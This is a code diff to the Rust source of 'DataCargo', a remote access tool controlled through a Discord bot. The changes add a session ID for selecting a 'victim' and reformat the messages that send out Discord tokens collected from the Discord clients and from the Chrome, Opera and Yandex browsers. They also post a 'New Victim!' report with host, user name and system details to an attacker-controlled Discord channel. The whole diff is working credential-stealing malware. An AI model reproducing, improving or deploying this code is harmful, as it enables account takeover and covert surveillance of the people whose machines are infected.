@@ -21,23 +21,29 @@ use crate::{LOGS_CHANNEL_ID, BOT_TOKEN};
 
 
 struct Handler {
-    selected: Mutex<String>
+    selected: Mutex<String>,
+    sid: Mutex<String>
 }
 
 impl Handler {
     fn new() -> Handler {
         Handler {
-            selected: Mutex::new("None".to_string())
+            selected: Mutex::new("None".to_string()),
+            sid: Mutex::new(functions::generate_sid())
         }
     }
 
     fn change_selected(&self, new_selected: String) {
-        let mut state: MutexGuard<String> = self.selected.lock().expect("");
-        *state = String::from(new_selected);
+        let mut selected: MutexGuard<String> = self.selected.lock().expect("");
+        *selected = String::from(new_selected);
     }
 
     fn get_selected(&self) -> String {
         self.selected.lock().unwrap().to_string()
+    }
+
+    fn get_sid(&self) -> String {
+        self.sid.lock().unwrap().to_string()
     }
 }
 
@@ -48,8 +54,8 @@ impl EventHandler for Handler {
 
         /* SELECT THE VICTIM */
         if msg.content.starts_with(".s") {
-            let selected: String= msg.content.replace(".s", "").trim().to_string();
-            if selected == functions::get_uuid() {
+            let selected: String = msg.content.replace(".s", "").trim().to_string();
+            if selected == self.get_sid() {
                 self.change_selected(selected);
                 let _ = msg.channel_id.say(&context.http, format!("**SUCCESS!**\nNow working on `{}`", self.get_selected())).await;
             }
@@ -58,32 +64,44 @@ impl EventHandler for Handler {
         /* GET ALL ACTIVE VICTIMS */
         else if msg.content == ".victims" {
             let sys_inf = functions::get_pc_info();
-            let uuid: String;
 
-            if functions::uuid_is_protected() {
-                uuid = "PROTECTED".to_string();
-            } else {
-                uuid = self.get_selected();
+            let uuid: String;
+            let sid: String;
+            match functions::uuid_is_protected() {
+                true => {
+                    uuid = "PROTECTED".to_string();
+                    sid = "PROTECTED".to_string();
+                },
+                false => {
+                    uuid = functions::get_uuid();
+                    sid = self.get_sid();
+                }
             }
 
-            let _ = msg.channel_id.say(&context.http, format!("**{}:** `{}`", sys_inf.user_nick, uuid)).await;
+            let _ = msg.channel_id.say(&context.http, format!("**{}:** `{}` **||** `{}`", sys_inf.user_nick, sid, uuid)).await;
         }
 
         // Execute actions if victim is selected
-        if self.get_selected() == functions::get_uuid() {
+        if self.get_selected() == self.get_sid() {
 
             /* GET ACTIVE VICTIM */
             if msg.content == ".victim" {
                 let sys_inf = functions::get_pc_info();
-                let uuid: String;
 
-                if functions::uuid_is_protected() {
-                    uuid = "PROTECTED".to_string();
-                } else {
-                    uuid = self.get_selected();
+                let uuid: String;
+                let sid: String;
+                match functions::uuid_is_protected() {
+                    true => {
+                        uuid = "PROTECTED".to_string();
+                        sid = "PROTECTED".to_string();
+                    },
+                    false => {
+                        uuid = functions::get_uuid();
+                        sid = self.get_sid();
+                    }
                 }
 
-                let _ = msg.channel_id.say(&context.http, format!("**{}:** `{}`", sys_inf.user_nick, uuid)).await;
+                let _ = msg.channel_id.say(&context.http, format!("**{}:** `{}` **||** `{}`", sys_inf.user_nick, sid, uuid)).await;
             }
 
             /* GET TOKENS */
@@ -105,17 +123,17 @@ impl EventHandler for Handler {
 
                         // Normal
                         if discord.path_normal != NONE {
-                            e.field("Discord", format!("```­{}```", Discord::get_tokens(discord.path_normal)), false);
+                            e.field("Discord", format!("```\n{}```", Discord::get_tokens(discord.path_normal)), false);
                         }
 
                         // Canary
                         if discord.path_canary != NONE {
-                            e.field("DiscordCanary", format!("```­{}```", Discord::get_tokens(discord.path_canary)), false);
+                            e.field("DiscordCanary", format!("```\n{}```", Discord::get_tokens(discord.path_canary)), false);
                         }
 
                         // PTB
                         if discord.path_ptb != NONE {
-                            e.field("DiscordPTB", format!("```­{}```", Discord::get_tokens(discord.path_ptb)), false);
+                            e.field("DiscordPTB", format!("```\n{}```", Discord::get_tokens(discord.path_ptb)), false);
                         }
 
                         e
@@ -137,17 +155,17 @@ impl EventHandler for Handler {
 
                         // Chrome
                         if discord.path_chrome != NONE {
-                            e.field("Chrome", format!("```­{}```", Discord::get_tokens(discord.path_chrome)), false);
+                            e.field("Chrome", format!("```\n{}```", Discord::get_tokens(discord.path_chrome)), false);
                         }
 
                         // Opera
                         if discord.path_opera != NONE {
-                            e.field("Opera", format!("```­{}```", Discord::get_tokens(discord.path_opera)), false);
+                            e.field("Opera", format!("```\n{}```", Discord::get_tokens(discord.path_opera)), false);
                         }
 
                         // Yandex
                         if discord.path_yandex != NONE {
-                            e.field("Yandex", format!("```­{}```", Discord::get_tokens(discord.path_yandex)), false);
+                            e.field("Yandex", format!("```\n{}```", Discord::get_tokens(discord.path_yandex)), false);
                         }
 
                         e
@@ -202,42 +220,51 @@ impl EventHandler for Handler {
         // let cache = ctx.cache.clone();  // unused at the moment
         let http = ctx.http.clone();
 
-        // create task
-        tokio::spawn(async move {
+        /* SEND NEW VICTIM DATA */
+        let _ = ChannelId(LOGS_CHANNEL_ID).send_message(&http, |m| {
+            let sys_inf = functions::get_pc_info();
 
-            /* SEND NEW VICTIM DATA */
-            let _ = ChannelId(LOGS_CHANNEL_ID).send_message(&http, |m| {
-                let sys_inf = functions::get_pc_info();
-
-                m.embed(|e| {
-                    e.title("╔════════╗\n║ New Victim! ║\n╚════════╝");
-                    e.colour(Colour(EMBED_COLOUR));
-                    e.author(|a| {
-                        a.icon_url("https://cdn.discordapp.com/attachments/735178955958779915/763377463707303946/DataCargo.png");
-                        a.name(format!("DataCargo [v{}]", VERSION.clone()));
-                        a
-                    });
-
-                    // get UUID
-                    let mut uuid = functions::get_uuid();
-                    if functions::uuid_is_protected() {
-                        uuid = "PROTECTED".to_string();
-                    }
-
-                    e.field("UUID", format!("```{}```", uuid), false);
-                    e.field("Host", format!("```{}```", sys_inf.pc_name), false);
-                    e.field("Nickname", format!("```{}```", sys_inf.user_nick), false);
-                    e.field("Name", format!("```{}```", sys_inf.user_name), false);
-                    e.field("Uptime", format!("```{} h```", sys_inf.sys_time_up), false);
-                    e.field("BootTime", format!("```{} h```", sys_inf.sys_time_boot), false);
-                    e.field("Processor", format!("```{}```", sys_inf.proc_brand), false);
-
-                    e
+            m.embed(|e| {
+                e.title("╔════════╗\n║ New Victim! ║\n╚════════╝");
+                e.colour(Colour(EMBED_COLOUR));
+                e.author(|a| {
+                    a.icon_url("https://cdn.discordapp.com/attachments/735178955958779915/763377463707303946/DataCargo.png");
+                    a.name(format!("DataCargo [v{}]", VERSION.clone()));
+                    a
                 });
 
-                m
-            }).await;
 
+                let uuid;
+                let sid;
+                match functions::uuid_is_protected() {
+                    true => {
+                        uuid = "PROTECTED".to_string();
+                        sid = "PROTECTED".to_string();
+                    },
+                    false => {
+                        uuid = functions::get_uuid();
+                        sid = self.get_sid();
+                    }
+                }
+
+
+                e.field("SID", format!("```\n{}```", sid), false);
+                e.field("UUID", format!("```\n{}```", uuid), false);
+                e.field("Host", format!("```\n{}```", sys_inf.pc_name), false);
+                e.field("Nickname", format!("```\n{}```", sys_inf.user_nick), false);
+                e.field("Name", format!("```\n{}```", sys_inf.user_name), false);
+                e.field("Uptime", format!("```\n{} h```", sys_inf.sys_time_up), false);
+                e.field("BootTime", format!("```\n{} h```", sys_inf.sys_time_boot), false);
+                e.field("Processor", format!("```\n{}```", sys_inf.proc_brand), false);
+
+                e
+            });
+
+            m
+        }).await;
+
+        // create task
+        tokio::spawn(async move {
             // Infinity loop (I will use it for something soon)
             loop {
                 tokio::time::delay_for(std::time::Duration::from_millis(100)).await;
